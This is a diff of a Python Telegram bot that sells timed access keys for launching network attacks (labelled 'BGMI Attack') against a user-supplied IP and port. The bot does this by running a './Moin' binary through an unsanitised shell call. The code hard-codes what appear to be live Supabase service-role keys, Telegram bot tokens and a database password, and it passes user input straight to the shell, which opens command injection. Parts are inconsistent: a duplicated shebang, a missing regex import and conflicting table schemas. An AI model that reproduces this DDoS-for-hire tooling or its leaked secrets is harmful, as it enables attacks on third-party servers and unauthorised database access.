@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # MADE BY @its_MATRIX_king
+#!/usr/bin/python3
 import telebot
 import multiprocessing
 import os
@@ -7,10 +8,10 @@ import random
 from datetime import datetime, timedelta
 import subprocess
 import sys
-import time 
+import time
 import logging
 import socket
-import pytz  # Import pytz for timezone handling
+import pytz
 from supabase import create_client, Client
 import psycopg2
 import threading
@@ -20,95 +21,150 @@ admin_id = ["7418099890"]
 admin_owner = ["7418099890"]
 os.system('chmod +x *')
 
-import os
-url = os.getenv("https://yxffpwhflqaapiwcpknf.supabase.co")
-key = os.getenv("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ")
-
-# Supabase credentials (replace with your actual credentials)
-url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
-key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
+# Supabase configuration
+url = "https://ldmyijysjjaimrbpqmek.supabase.co"
+key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkbXlpanlzamphaW1yYnBxbWVrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjkwNjE5MSwiZXhwIjoyMDQ4NDgyMTkxfQ.mCpuIq0yPRskbuyxjXk57sB99dDqhxZ2YRJxtwaRk3U"
 supabase: Client = create_client(url, key)
 
-bot = telebot.TeleBot('7599785141:AAFtrJQYnDy3Osx8vP3FOC8zFcLg1l9bGJc')
-
-# Setup timezone (IST)
+bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')
 IST = pytz.timezone('Asia/Kolkata')
 
-# Database connection details
+# Database connection
 connection = psycopg2.connect(
     host="aws-0-ap-south-1.pooler.supabase.com",
     database="postgres",
-    user="postgres.yxffpwhflqaapiwcpknf",
+    user="postgres.ldmyijysjjaimrbpqmek",
     password="Uthaya$4123",
     port=6543
 )
 cursor = connection.cursor()
 
-USER_TABLE = "users"  # Replace with your actual table name
+# Tables
+USER_TABLE = "users"
+KEYS_TABLE = "unused_keys"
 
-from datetime import datetime
-import pytz
+# Store ongoing attacks globally
+ongoing_attacks = []
 
-# Set up the timezone (Asia/Kolkata)
-IST = pytz.timezone('Asia/Kolkata')
-
-def save_user(user_id, expiration_time):
+def read_users():
     try:
-        expiration_time_str = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
-        cursor.execute(f"INSERT INTO {USER_TABLE} (user_id, expiration_time) VALUES (%s, %s)", (user_id, expiration_time_str))
-        connection.commit()
+        cursor.execute("""
+            SELECT user_id, expiration
+            FROM users
+            WHERE expiration > NOW()
+        """)
+        users = cursor.fetchall()
+        return {user[0]: user[1] for user in users}
     except Exception as e:
-        logging.error(f"Error saving user {user_id}: {e}")
+        logging.error(f"Error reading users: {e}")
+        connection.rollback()
+        return {}
+
+def clean_expired_users():
+    try:
+        cursor.execute("""
+            DELETE FROM users
+            WHERE expiration < NOW()
+            RETURNING user_id, username, key, expiration
+        """)
+        removed_users = cursor.fetchall()
+        connection.commit()
+
+        for user in removed_users:
+            user_id, username, key, expiration = user
+            
+            # Convert expiration to IST
+            expiration_ist = expiration.astimezone(IST)
+            
+            user_message = f"""
+🚫 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗘𝘅𝗽𝗶𝗿𝗲𝗱
+👤 𝗨𝘀𝗲𝗿: @{username}
+🔑 𝗞𝗲𝘆: {key}
+⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗮𝘁: {expiration_ist.strftime('%Y-%m-%d %H:%M:%S')} IST\n
+📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @its_MATRIX_King 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄 𝘆𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻.
+🔄 𝗨𝘀𝗲 /plan 𝘁𝗼 𝘃𝗶𝗲𝘄 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗽𝗹𝗮𝗻𝘀.
+"""
+            bot.send_message(user_id, user_message)
+
+        if removed_users:
+            admin_message = "🔔 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱:\n\n"
+            for user in removed_users:
+                expiration_ist = user[3].astimezone(IST)
+                admin_message += f"""
+👤 @{user[1]} (ID: {user[0]})
+🔑 𝗞𝗲𝘆: {user[2]}
+⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗮𝘁: {expiration_ist.strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+            admin_message += f"\n𝗧𝗼𝘁𝗮𝗹 𝗿𝗲𝗺𝗼𝘃𝗲𝗱: {len(removed_users)}"
+            
+            for admin in admin_id:
+                bot.send_message(admin, admin_message)
+
+    except Exception as e:
+        logging.error(f"Error cleaning expired users: {e}")
         connection.rollback()
 
-# Function to read users from the database
-def read_users():
-    cursor.execute(f"SELECT user_id, expiration_time FROM {USER_TABLE}")
-    users = cursor.fetchall()
-    
-    # Convert expiration_time to datetime and return a dictionary of users
-    user_dict = {}
-    for user_id, expiration_time in users:
-        # Ensure expiration_time is timezone-aware
-        if expiration_time.tzinfo is None:  # Check if naive (no timezone)
-            expiration_time = IST.localize(expiration_time)  # Localize it to IST
-        
-        user_dict[user_id] = expiration_time
-    return user_dict
-
-# Handler for removing a user
-def remove_expired_users():
-    current_time = datetime.now(IST)  # Get the current time in IST
+def create_tables():
     try:
-        # Delete users whose expiration time has passed
-        cursor.execute(f"DELETE FROM {USER_TABLE} WHERE expiration_time < %s", (current_time.strftime("%Y-%m-%d %H:%M:%S"),))
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                user_id TEXT PRIMARY KEY,
+                username TEXT,
+                key TEXT,
+                redeemed_at TIMESTAMP WITH TIME ZONE,
+                expiration TIMESTAMP WITH TIME ZONE
+            )
+        """)
+        
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS unused_keys (
+                key TEXT PRIMARY KEY,
+                duration INTEGER,
+                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
+                is_used BOOLEAN DEFAULT FALSE
+            )
+        """)
         connection.commit()
     except Exception as e:
-        logging.error(f"Error while removing expired users: {e}")
-        print(f"Error while removing expired users: {e}")
-        connection.rollback()  # Rollback the transaction on error
+        logging.error(f"Error creating tables: {e}")
+        connection.rollback()
 
-# Periodically check and remove expired users
-def periodic_expiration_check(interval=60):
-    while True:
-        remove_expired_users()
-        time.sleep(interval)
 
-# Start periodic expiration check in a background thread
-def start_periodic_expiration_check():
-    expiration_thread = threading.Thread(target=periodic_expiration_check, args=(60,), daemon=True)
-    expiration_thread.start()
+def setup_database():
+    try:
+        # Drop existing tables
+        cursor.execute("DROP TABLE IF EXISTS users")
+        cursor.execute("DROP TABLE IF EXISTS unused_keys")
+        
+        # Create users table with all required fields
+        cursor.execute("""
+            CREATE TABLE users (
+                user_id TEXT PRIMARY KEY,
+                username TEXT,
+                key TEXT,
+                expiration TIMESTAMP WITH TIME ZONE
+            )
+        """)
+        
+        # Create unused_keys table
+        cursor.execute("""
+            CREATE TABLE unused_keys (
+                key_code TEXT PRIMARY KEY,
+                duration TEXT,
+                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+        connection.commit()
+        
+    except Exception as e:
+        logging.error(f"Database setup error: {e}")
+        connection.rollback()
 
-# Call the function to start periodic expiration checks when the script is executed
-start_periodic_expiration_check()
-# Handler for adding a user
 def parse_time_input(time_input):
-    # Use regex to extract the number and unit (e.g., 1m, 2h, 3d)
     match = re.match(r"(\d+)([mhd])", time_input)
     if match:
         number = int(match.group(1))
         unit = match.group(2)
-
         if unit == "m":
             return timedelta(minutes=number)
         elif unit == "h":
@@ -117,537 +173,631 @@ def parse_time_input(time_input):
             return timedelta(days=number)
     return None
 
-@bot.message_handler(commands=['add'])
-def add_user(message):
+@bot.message_handler(commands=['key'])
+def generate_key(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_owner:
+        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
+        return
     try:
+        args = message.text.split()
+        if len(args) != 2:
+            bot.reply_to(message, "📝 Usage: /key <duration>\nExample: 1d, 7d, 30d")
+            return
+        duration_str = args[1]
+        duration = parse_time_input(duration_str)
+        if not duration:
+            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
+            return
+        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
+        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
+        key = f"MATRIX-VIP-{letters}{numbers}"
+        cursor.execute("""
+            INSERT INTO unused_keys (key, duration, created_at, is_used)
+            VALUES (%s, %s, NOW(), FALSE)
+        """, (key, duration.total_seconds()))
+        connection.commit()
+        bot.reply_to(message, f"""✅ Key Generated Successfully
+🔑 Key: `{key}`
+⏱ Duration: {duration_str}
+📅 Generated: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST""")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error generating key: {str(e)}")
+        connection.rollback()
+
+@bot.message_handler(commands=['redeem'])
+def redeem_key(message):
+    try:
+        args = message.text.split()
+        if len(args) != 2:
+            bot.reply_to(message, "📝 Usage: /redeem <key>")
+            return
+
+        key = args[1].strip()
         user_id = str(message.chat.id)
+        username = message.from_user.username or "Unknown"
 
-        if user_id in admin_owner:
-            command = message.text.split()
+        # Check if key is valid and unused
+        cursor.execute("""
+            SELECT duration FROM unused_keys
+            WHERE key = %s AND is_used = FALSE
+        """, (key,))
+        result = cursor.fetchone()
+        if not result:
+            bot.reply_to(message, "❌ Invalid or already used key!")
+            return
 
-            if len(command) == 3:
-                user_to_add = command[1]
-                time_input = command[2]
+        duration = result[0]
+        redeemed_at = datetime.now(IST)
+        expiration = redeemed_at + timedelta(seconds=duration)
 
-                # Parse the time input
-                time_delta = parse_time_input(time_input)
-                
-                if time_delta:
-                    # Calculate expiration time
-                    expiration_time = datetime.now(IST) + time_delta
-                    save_user(user_to_add, expiration_time)
+        cursor.execute("""
+            INSERT INTO users (user_id, username, key, redeemed_at, expiration)
+            VALUES (%s, %s, %s, %s, %s)
+            ON CONFLICT (user_id) DO UPDATE
+            SET key = EXCLUDED.key, redeemed_at = EXCLUDED.redeemed_at,
+                expiration = EXCLUDED.expiration, username = EXCLUDED.username
+        """, (user_id, username, key, redeemed_at, expiration))
 
-                    response = (f"User {user_to_add} added successfully.\n"
-                                f"Access valid for {time_input} (Expires at: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')} IST).")
-                else:
-                    response = "Error: Please specify a valid time format (e.g., 1m, 2h, 3d)."
-            else:
-                response = "Usage: /add <user_id> <time_in_format_m/h/d>"
-        else:
-            response = "Only Admin Can Run This Command."
-        
-        bot.reply_to(message, response)
+        cursor.execute("UPDATE unused_keys SET is_used = TRUE WHERE key = %s", (key,))
+        connection.commit()
+
+        # Send success message to user
+        user_message = f"""
+✅ Key Redeemed Successfully!
+🕰️ Redeem : {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
+📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+        bot.reply_to(message, user_message)
+
+        # Notify admin
+        admin_message = f"""
+🔑 Key Redeemed Alert
+👤 User: @{username} (ID: {user_id})
+🔑 Key: {key}
+⏳ Duration: {timedelta(seconds=duration)}
+🕰️ Redeemed at: {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
+📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+        for admin in admin_id:
+            bot.send_message(admin, admin_message)
 
     except Exception as e:
-        logging.error(f"Error in /add command: {e}")
-        bot.reply_to(message, "An error occurred while processing your request. Please try again.")
+        bot.reply_to(message, f"❌ Error redeeming key: {str(e)}")
+        connection.rollback()
 
 @bot.message_handler(commands=['remove'])
-def remove_user(message):
+def remove_key(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_owner:
+        bot.reply_to(message, "Only Admin Can Run This Command.")
+        return
     try:
-        user_id = str(message.chat.id)
-
-        if user_id in admin_owner:
-            command = message.text.split()
-
-            if len(command) == 2:
-                user_to_remove = command[1]
-
-                # Remove the user from the database
-                cursor.execute(f"DELETE FROM {USER_TABLE} WHERE user_id = %s", (user_to_remove,))
-                connection.commit()
-
-                response = f"User {user_to_remove} has been removed successfully."
-            else:
-                response = "Usage: /remove <user_id>"
-        else:
-            response = "Only Admin Can Run This Command."
-
-        bot.reply_to(message, response)
-
+        args = message.text.split()
+        if len(args) != 2:
+            bot.reply_to(message, "Usage: /remove <key>")
+            return
+        key = args[1]
+        cursor.execute("DELETE FROM unused_keys WHERE key = %s", (key,))
+        cursor.execute("DELETE FROM users WHERE key = %s", (key,))
+        connection.commit()
+        bot.reply_to(message, f"Key {key} has been removed successfully.")
     except Exception as e:
-        logging.error(f"Error in /remove command: {e}")
-        bot.reply_to(message, "An error occurred while processing your request. Please try again.")
+        logging.error(f"Error removing key: {e}")
+        bot.reply_to(message, "An error occurred while removing the key.")
 
+@bot.message_handler(commands=['allkeys'])
+def show_all_keys(message):
+    user_id = str(message.chat.id)
+    if user_id not in admin_owner:
+        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
+        return
+
+    try:
+        cursor.execute("""
+            SELECT key, duration, created_at 
+            FROM unused_keys 
+            WHERE is_used = FALSE 
+            ORDER BY created_at DESC
+        """)
+        keys = cursor.fetchall()
+        
+        if not keys:
+            bot.reply_to(message, "📝 No unused keys available")
+            return
+
+        response = "🔑 Available Keys:\n\n"
+        ist_tz = pytz.timezone('Asia/Kolkata')
+        
+        for key in keys:
+            key_code = key[0]
+            duration_seconds = float(key[1])
+            created_at = key[2].astimezone(ist_tz)
+            
+            # Convert duration to days, hours, minutes
+            days = int(duration_seconds // (24 * 3600))
+            remaining_seconds = duration_seconds % (24 * 3600)
+            hours = int(remaining_seconds // 3600)
+            minutes = int((remaining_seconds % 3600) // 60)
+            
+            response += f"Key: `{key_code}`\n"
+            if days > 0:
+                response += f"Duration: {days}d {hours}h {minutes}m\n"
+            elif hours > 0:
+                response += f"Duration: {hours}h {minutes}m\n"
+            else:
+                response += f"Duration: {minutes}m\n"
+            response += f"Created: {created_at.strftime('%Y-%m-%d %H:%M:%S')} IST\n\n"
+            
+        bot.reply_to(message, response)
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error fetching keys: {str(e)}")
 
 @bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_owner:
-        users = read_users()  # Fetch from Supabase
-        response = "Authorized Users:\n"
-        current_time = datetime.now(IST)
+def show_users(message):
+    if str(message.chat.id) not in admin_id:
+        bot.reply_to(message, "Only administrators can view users.")
+        return
 
-        active_users = [
-            user_id for user_id, exp_time in users.items() if exp_time > current_time
-        ]
-
-        if active_users:
-            for user_id in active_users:
-                response += f"- {user_id} (Expires at: {users[user_id]})\n"
-        else:
-            response = "No active users found."
-    else:
-        response = "Only Admin Can Run This Command."
-    bot.reply_to(message, response)
-        
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
-    response = f"Your ID: {user_id}"
-    bot.reply_to(message, response)
-
-#Store ongoing attacks globally
-ongoing_attacks = []
-
-# Store user attack tracking
-user_attacks = {}
-
-ongoing_attacks = {}  # Changed to dict to track per-user attacks
-
-class UserAttackState:
-    def __init__(self):
-        self.active_attacks = 0
-        self.cooldown_until = None
-
-    def can_attack(self):
-        current_time = datetime.now(IST)
-        
-        # If user is in cooldown, check if it's expired
-        if self.cooldown_until and current_time < self.cooldown_until:
-            return False, f"You are in cooldown. Wait until {self.cooldown_until.strftime('%H:%M:%S')}"
-        
-        # Check if user has reached attack limit
-        if self.active_attacks >= 2:
-            return False, "You already have 2 active attacks. Please wait for them to finish."
-        
-        return True, None
-
-    def start_attack(self):
-        self.active_attacks += 1
-        
-        # If this is the second attack, schedule the cooldown
-        if self.active_attacks >= 2:
-            self.schedule_cooldown()
-
-    def end_attack(self):
-        self.active_attacks = max(0, self.active_attacks - 1)
-        
-        # If all attacks are finished and cooldown was scheduled
-        if self.active_attacks == 0 and self.cooldown_until:
-            self.start_cooldown()
-
-    def schedule_cooldown(self):
-        # Schedule cooldown to start after attacks finish
-        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
-
-    def start_cooldown(self):
-        self.cooldown_until = datetime.now(IST) + timedelta(minutes=8)
-        self.active_attacks = 0
-
-def execute_attack(message, user_id, attack_info, command):
     try:
-        # Run attack command without capturing output - it will show in shell
-        subprocess.run(command, shell=True, capture_output=False, text=True)
+        cursor.execute("""
+            SELECT user_id, username, key, expiration 
+            FROM users 
+            WHERE expiration > NOW() 
+            ORDER BY expiration DESC
+        """)
+        users = cursor.fetchall()
         
-        # Remove attack from ongoing list
-        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
-            ongoing_attacks[user_id].remove(attack_info)
+        if not users:
+            bot.reply_to(message, "📝 No active users found")
+            return
+
+        response = "👥 Active Users:\n\n"
+        current_time = datetime.now(IST)
         
-        # Update user's attack state
-        if user_id in user_attacks:
-            user_attacks[user_id].end_attack()
+        for user in users:
+            user_id, username, key, expiration = user
+            expiration = expiration.astimezone(IST)
+            remaining = expiration - current_time
+            
+            # Calculate remaining time components
+            days = remaining.days
+            hours = remaining.seconds // 3600
+            minutes = (remaining.seconds % 3600) // 60
+            
+            response += (f"🆔 ID: {user_id}\n"
+                        f"👤 User: @{username}\n"
+                        f"🔑 Key: {key}\n"
+                        f"⏳ Remaining: {days}d {hours}h {minutes}m\n"
+                        f"📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST\n\n")
         
-        # Only send completion notification
-        bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King")
+        bot.reply_to(message, response)
     except Exception as e:
-        print(f"Error executing attack: {str(e)}")  # Print error to shell
-        # Ensure attack is removed from tracking on error
-        if user_id in ongoing_attacks and attack_info in ongoing_attacks[user_id]:
-            ongoing_attacks[user_id].remove(attack_info)
-        if user_id in user_attacks:
-            user_attacks[user_id].end_attack()
+        logging.error(f"Error fetching users: {e}")
+        bot.reply_to(message, "❌ Error fetching user details")
+
+
+ongoing_attacks = []
+attack_cooldown = {}
 
 def start_attack_reply(message, target, port, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    user_id = str(message.chat.id)
-
-    if user_id not in ongoing_attacks:
-        ongoing_attacks[user_id] = []
-
-    attack_info = {
+    username = message.from_user.username if message.from_user.username else message.from_user.first_name
+    user_id = message.from_user.id
+    start_time = datetime.now(IST)
+    
+    # Add attack to ongoing attacks list
+    ongoing_attacks.append({
         'user': username,
+        'user_id': user_id,
         'target': target,
         'port': port,
         'time': time,
-        'start_time': datetime.now(IST)
-    }
+        'start_time': start_time
+    })
     
-    ongoing_attacks[user_id].append(attack_info)
+    # Format initial attack message for user
+    user_response = f"""
+🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
 
-    if user_id in user_attacks:
-        user_attacks[user_id].start_attack()
+👤 𝗨𝘀𝗲𝗿: {username}
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
+🔌 𝗣𝗼𝗿𝘁: {port}
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
+📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST
 
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
-    bot.reply_to(message, response)
+⚡️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
+"""
+    bot.reply_to(message, user_response)
+    
+    # Send notification to admin
+    admin_notification = f"""
+🚨 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
 
-    full_command = f"./Moin {target} {port} {time} 200"
+👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
+🔌 𝗣𝗼𝗿𝘁: {port}
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
+📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%Y-%m-%d %H:%M:%S')} IST
+🌐 𝗨𝘀𝗲𝗿 𝗜𝗣: {message.from_user.language_code}
+
+⚠️ 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
+"""
+    for admin in admin_id:
+        bot.send_message(admin, admin_notification)
+    
     try:
-        print(f"\nExecuting attack command: {full_command}")  # Print to shell
-        print(f"Attack started by user: {username} ({user_id})")  # Print to shell
+        # Execute attack
+        subprocess.run(f"./Moin {target} {port} {time} 200", shell=True)
         
-        # Start attack in a separate thread
-        attack_thread = threading.Thread(target=execute_attack, args=(message, user_id, attack_info, full_command))
-        attack_thread.start()
+        # Calculate attack duration
+        end_time = datetime.now(IST)
+        duration = (end_time - start_time).total_seconds()
+        
+        # Remove from ongoing attacks
+        ongoing_attacks.pop()
+        
+        # Send completion message to user
+        completion_msg = f"""
+✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
+
+⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
+📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
+"""
+        bot.reply_to(message, completion_msg)
+        
+        # Send completion notification to admin
+        admin_completion = f"""
+✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
+
+👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
+🔌 𝗣𝗼𝗿𝘁: {port}
+⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
+📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+        for admin in admin_id:
+            bot.send_message(admin, admin_completion)
         
     except Exception as e:
-        print(f"Error starting attack: {str(e)}")  # Print to shell
-        # Clean up attack record on error
-        ongoing_attacks[user_id].remove(attack_info)
-        user_attacks[user_id].end_attack()
+        # Handle attack failure
+        ongoing_attacks.pop()
+        error_msg = f"""
+❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
+
+⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
+📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.
+"""
+        bot.reply_to(message, error_msg)
+        
+        # Send failure notification to admin
+        admin_failure = f"""
+❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
+
+👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
+🔌 𝗣𝗼𝗿𝘁: {port}
+⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
+📅 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
+"""
+        for admin in admin_id:
+            bot.send_message(admin, admin_failure)
+
 
 @bot.message_handler(commands=['matrix'])
 def handle_matrix(message):
-    remove_expired_users()
     user_id = str(message.chat.id)
-    
     users = read_users()
-    command = message.text.split()
     
-    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"
+    # Check if user is authorized
+    if user_id not in admin_owner and user_id not in users:
+        bot.reply_to(message, """
+⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱
+• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱
+• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @its_MATRIX_King 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲
+""")
+        return
 
-    if user_id in admin_owner or user_id in users:
-        if user_id in admin_owner:
-            # Admin owner can bypass attack limits and cooldown
-            if len(command) == 4:
-                try:
-                    target = command[1]
-                    port = int(command[2])
-                    time = int(command[3])
+    # Check for ongoing attacks
+    if ongoing_attacks:
+        attack_info = ongoing_attacks[0]  # Get the current attack
+        elapsed = (datetime.now(IST) - attack_info['start_time']).total_seconds()
+        remaining = max(0, attack_info['time'] - int(elapsed))
+        
+        bot.reply_to(message, f"""
+⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀
 
-                    if time > 180:
-                        response = "Error: Time interval must be 180 seconds or less"
-                    else:
-                        start_attack_reply(message, target, port, time)
-                        return
-                except ValueError:
-                    response = "Error: Please ensure port and time are integers."
-            else:
-                response = "Usage: /matrix <target> <port> <time>"
-        else:
-            # Initialize attack state for user if not exists
-            if user_id not in user_attacks:
-                user_attacks[user_id] = UserAttackState()
-            
-            # Check if user can attack
-            can_attack, error_message = user_attacks[user_id].can_attack()
-            
-            if can_attack:
-                if len(command) == 4:
-                    try:
-                        target = command[1]
-                        port = int(command[2])
-                        time = int(command[3])
+⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds
 
-                        if time > 180:
-                            response = "Error: Time interval must be 180 seconds or less"
-                        else:
-                            start_attack_reply(message, target, port, time)
-                            return
-                    except ValueError:
-                        response = "Error: Please ensure port and time are integers."
-                else:
-                    response = "Usage: /matrix <target> <port> <time>"
-            else:
-                response = error_message
+📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵
+""")
+        return
 
-    bot.reply_to(message, response)
+    # Parse command arguments
+    args = message.text.split()
+    if len(args) != 4:
+        bot.reply_to(message, """
+📝 𝗨𝘀𝗮𝗴𝗲: /matrix <target> <port> <time>
+𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /matrix 1.1.1.1 80 120
+
+⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
+• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 200 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀
+""")
+        return
+
+    try:
+        target = args[1]
+        port = int(args[2])
+        time = int(args[3])
+
+        # Validate time limit
+        if time > 200:
+            bot.reply_to(message, "⚠️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 200 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
+            return
+
+        # Check cooldown for non-admin users
+        if user_id not in admin_owner:
+            if user_id in attack_cooldown:
+                remaining = attack_cooldown[user_id] - datetime.now(IST)
+                if remaining.total_seconds() > 0:
+                    minutes = int(remaining.total_seconds() // 60)
+                    seconds = int(remaining.total_seconds() % 60)
+                    bot.reply_to(message, f"""
+⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗔𝗰𝘁𝗶𝘃𝗲
+𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁: {minutes}m {seconds}s
+""")
+                    return
+
+        # Start the attack
+        start_attack_reply(message, target, port, time)
+
